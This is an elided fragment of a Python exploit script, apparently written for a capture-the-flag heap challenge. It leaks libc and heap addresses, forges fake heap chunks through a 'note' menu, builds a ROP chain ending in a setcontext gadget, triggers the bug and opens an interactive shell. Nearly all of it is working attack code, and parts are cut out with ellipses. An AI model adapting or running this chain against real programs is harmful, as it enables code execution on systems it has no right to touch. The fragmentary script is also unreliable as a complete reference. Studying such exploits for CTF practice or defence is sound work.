...
log.info('main_arena : {}'.format(hex(main_arena-9922288)))
...
rop = ''
rop += 'b'*(0x90-len(rop))
rop += p64(heap_base+78368+1296)     # rsp
rop += p64(libc_base+ret)       # rcx
rop += 'c'*(0xc0-len(rop))
rop += p64(pop_rdi)
rop += p64(heap_base+78440+1296)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)
...
fake_info = p64(0)*3
fake_info += p32(0x28)+p32(0xa)
fake_info += p64(heap_base+72992)+p64(0x70)
fake_info += p64(heap_base+76816)+p64(0)
fake_info += p64(0)+p64(0x71)
fake_info += 'X'*8

note(6,0x520, fake_info)     # chunk p2
...
fake_info = ''          # Offset as ...
fake_info += p64(0)+p64(heap_base+72928-1296+0x100)
fake_info += p64(0)+p32(0x28)+p32(0x0)
fake_info += p64(0)+p64(0x40)
#fake_info += p64(heap_base+74096)+p64(0)
fake_info += p64(heap_base+78160)+p64(heap_base+78144-0x90+1296)
...
note(10,0x60,pay)
'''
note(10,0x30,p64(libc_base+ret)+p64(setcontext_53))
# == Trigger == # (with. abort())
raw_input()
'''
menu('note')

p.sendlineafter('Cell: ','10')
p.sendlineafter('Size: ','999999')
'''
p.interactive()
